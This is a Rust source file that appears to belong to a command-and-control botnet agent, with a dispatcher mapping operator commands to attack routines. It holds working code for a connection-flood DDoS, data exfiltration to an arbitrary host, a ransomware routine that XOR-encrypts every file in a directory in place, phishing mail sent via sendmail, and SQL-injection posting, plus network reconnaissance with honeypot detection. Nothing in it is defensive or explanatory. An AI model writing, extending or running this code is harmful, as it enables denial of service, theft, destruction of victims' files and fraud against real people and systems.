use crate::commands::Command;
use crate::error::C2Error;
use crate::recon::{ReconConfig, ReconEngine};
use crate::compute::capability;
use stalinium_evolution::node::SoupSnapshot;
use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;
use tokio::sync::watch;
use std::process::Command as ShellCommand;
use std::fs;
use std::io::{Read, Write};

pub async fn execute_attack(
    command: &Command,
    evo_snap: &watch::Receiver<SoupSnapshot>,
) -> Result<String, C2Error> {
    match command.command.as_str() {
        "__heartbeat__" => Ok(String::new()),
        "ddos" => ddos_attack(&command.args).await.map(|_| "OK".to_string()),
        "exfiltrate" => data_exfiltration(&command.args).await.map(|_| "OK".to_string()),
        "ransomware" => ransomware_attack(&command.args).await.map(|_| "OK".to_string()),
        "phishing" => phishing_attack(&command.args).await.map(|_| "OK".to_string()),
        "sql_injection" => sql_injection_attack(&command.args).await.map(|_| "OK".to_string()),
        "recon_scan" => recon_scan(&command.args).await,
        "recon_full" => recon_full(&command.args).await,
        "compute_profile" => compute_profile().await,
        "compute_status" => compute_status(&command.args).await,
        "evolution_status" => evolution_status(evo_snap).await,
        _ => Err(C2Error::CommandError("Unknown command".to_string())),
    }
}

async fn ddos_attack(args: &[String]) -> Result<(), C2Error> {
    if args.len() < 2 {
        return Err(C2Error::CommandError("Missing target IP or port".to_string()));
    }

    let target_ip = &args[0];
    let target_port: u16 = args[1].parse().map_err(|e: std::num::ParseIntError| C2Error::CommandError(e.to_string()))?;

    for _ in 0..1000 {
        let target = target_ip.clone();
        tokio::spawn(async move {
            if let Ok(mut stream) = TcpStream::connect((target.as_str(), target_port)).await {
                let _ = stream.write_all(b"GET / HTTP/1.1\r\n\r\n").await;
            }
        });
    }
    Ok(())
}

async fn data_exfiltration(args: &[String]) -> Result<(), C2Error> {
    if args.len() < 3 {
        return Err(C2Error::CommandError("Missing target IP, port, or data".to_string()));
    }

    let target_ip = &args[0];
    let target_port: u16 = args[1].parse().map_err(|e: std::num::ParseIntError| C2Error::CommandError(e.to_string()))?;
    let data = args[2].as_bytes();
    
    let mut stream = TcpStream::connect((target_ip.as_str(), target_port)).await?;
    stream.write_all(data).await?;
    Ok(())
}

async fn ransomware_attack(args: &[String]) -> Result<(), C2Error> {
    if args.len() < 2 {
        return Err(C2Error::CommandError("Missing target directory or encryption key".to_string()));
    }

    let target_directory = &args[0];
    let encryption_key = &args[1];

    for entry in fs::read_dir(target_directory)? {
        let entry = entry?;
        let path = entry.path();
        if path.is_file() {
            let mut file = fs::File::open(&path)?;
            let mut content = Vec::new();
            file.read_to_end(&mut content)?;

            let encrypted_content: Vec<u8> = content.iter().zip(encryption_key.bytes().cycle())
                .map(|(a, b)| a ^ b).collect();

            let mut encrypted_file = fs::File::create(&path)?;
            encrypted_file.write_all(&encrypted_content)?;
        }
    }
    Ok(())
}

async fn phishing_attack(args: &[String]) -> Result<(), C2Error> {
    if args.len() < 2 {
        return Err(C2Error::CommandError("Missing target email or email content".to_string()));
    }

    let target_email = &args[0];
    let email_content = &args[1];

    let sendmail_path = "/usr/sbin/sendmail";
    let output = ShellCommand::new(sendmail_path)
        .arg(target_email)
        .output()
        .expect("Failed to execute sendmail command");

    if output.status.success() {
        let mut mail = fs::File::create("/tmp/phishing_email.txt")?;
        write!(mail, "Subject: Urgent Update Required\n\n{}", email_content)?;
        ShellCommand::new(sendmail_path)
            .arg("-t")
            .stdin(fs::File::open("/tmp/phishing_email.txt")?)
            .output()
            .expect("Failed to send phishing email");
    } else {
        return Err(C2Error::CommandError("Failed to execute sendmail".to_string()));
    }

    Ok(())
}

async fn sql_injection_attack(args: &[String]) -> Result<(), C2Error> {
    if args.len() < 2 {
        return Err(C2Error::CommandError("Missing target URL or malicious query".to_string()));
    }

    let target_url = &args[0];
    let malicious_query = &args[1];

    let client = reqwest::Client::new();
    let res = client.post(target_url)
        .body(malicious_query.clone())
        .send()
        .await?;

    if res.status().is_success() {
        println!("SQL injection successful: {}", res.text().await?);
    } else {
        return Err(C2Error::CommandError("SQL injection failed".to_string()));
    }

    Ok(())
}

async fn recon_scan(args: &[String]) -> Result<String, C2Error> {
    if args.is_empty() {
        return Err(C2Error::CommandError("recon_scan requires target specs".to_string()));
    }

    let mut config = ReconConfig::default();

    if args.len() > 1 {
        config.ports = args[1].split(',')
            .filter_map(|p| p.trim().parse::<u16>().ok())
            .collect();
    }
    if args.len() > 2 {
        config.connect_timeout_ms = args[2].parse().unwrap_or(3000);
    }
    if args.len() > 3 {
        config.rate_per_sec = args[3].parse().unwrap_or(100.0);
    }

    let engine = ReconEngine::new(config);
    let targets: Vec<String> = args[0].split(',').map(|s| s.trim().to_string()).collect();
    let expanded = engine.expand_targets(&targets)?;
    let open = engine.scan_targets(&expanded).await?;

    serde_json::to_string(&open).map_err(|e| C2Error::ReconError(e.to_string()))
}

async fn compute_profile() -> Result<String, C2Error> {
    let cap = capability::profile_local();
    serde_json::to_string(&cap).map_err(|e| C2Error::CommandError(e.to_string()))
}

async fn compute_status(_args: &[String]) -> Result<String, C2Error> {
    let cap = capability::profile_local();
    let score = cap.compute_score(0);
    serde_json::to_string(&score).map_err(|e| C2Error::CommandError(e.to_string()))
}

async fn evolution_status(snap_rx: &watch::Receiver<SoupSnapshot>) -> Result<String, C2Error> {
    let snap = snap_rx.borrow().clone();
    serde_json::to_string(&snap).map_err(|e| C2Error::CommandError(e.to_string()))
}

async fn recon_full(args: &[String]) -> Result<String, C2Error> {
    if args.is_empty() {
        return Err(C2Error::CommandError("recon_full requires target specs".to_string()));
    }

    let mut config = ReconConfig::default();

    if args.len() > 1 {
        config.ports = args[1].split(',')
            .filter_map(|p| p.trim().parse::<u16>().ok())
            .collect();
    }
    if args.len() > 2 {
        config.connect_timeout_ms = args[2].parse().unwrap_or(3000);
    }
    if args.len() > 3 {
        config.rate_per_sec = args[3].parse().unwrap_or(100.0);
    }
    if args.len() > 4 {
        config.honeypot_threshold = args[4].parse().unwrap_or(0.6);
    }

    let targets: Vec<String> = args[0].split(',').map(|s| s.trim().to_string()).collect();
    let engine = ReconEngine::new(config);
    let result = engine.full_recon(&targets).await?;

    serde_json::to_string(&result).map_err(|e| C2Error::ReconError(e.to_string()))
}
